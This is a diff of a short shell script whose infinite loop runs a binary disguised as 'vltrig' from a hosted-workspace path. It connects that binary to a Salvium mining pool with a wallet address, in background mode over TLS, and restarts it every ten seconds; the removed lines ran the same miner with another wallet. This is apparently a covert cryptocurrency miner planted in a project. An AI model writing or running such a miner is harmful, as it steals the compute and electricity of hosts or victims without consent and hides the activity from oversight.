@@ -1,12 +1,11 @@
 while true
 do
-  echo "aman bang"
+  /home/runner/workspace/vltrig \
+    -o sg.salvium.herominers.com:1230 \
+    -u SC1siBfG9HHfqjGkSYgEqALbd4WQZ37ZAj9mjPMgfqzdUiHrRuKEYLRLEm7uQt81xBgs2QzEEi6Yi6VXXqU5p6U8f124RMEobFN \
+    -B \
+    --tls
 
-  ./vltrig \
-    -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjUMj4s2dA5CWbeBa \
-    </dev/null >/dev/null 2>&1
-
-  echo "waduhh, restarting in 10 seconds"
-
+  echo "waduhh. Restarting in 10 seconds..."
   sleep 10
 done
